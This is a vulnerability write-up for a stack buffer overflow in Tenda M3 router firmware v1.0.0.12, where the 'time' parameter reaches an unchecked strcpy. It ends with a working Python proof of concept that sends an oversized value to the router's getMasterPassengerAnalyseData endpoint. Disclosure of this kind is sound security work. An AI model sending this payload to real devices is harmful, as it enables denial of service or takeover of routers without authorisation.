# Tenda M3 formGetMasterPassengerAnalyseData
### Overview
vendor: Tenda

product: M3

version: v1.0.0.12

type: Stack Overflow
### Vulnerability Description
Tenda M3 v1.0.0.12 were discovered to contain a stack overflow via the time parameter in the formGetMasterPassengerAnalyseData function.

### Vulnerability details
In function formGetMasterPassengerAnalyseData line 87, it reads in a user-provided parameter `time`. The variable `src` is passed to the `strcpy` function without any length check, which may overflow the stack-based buffer `s`. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

![](images/2.png)

![](images/3.png)

### POC
```python
import requests

data = {
    "time": "a"*0x2000
}
cookies = {
    "user": "admin"
}
res = requests.post("http://192.168.0.1/goform/getMasterPassengerAnalyseData", data=data, cookies=cookies)
print(res.content)
```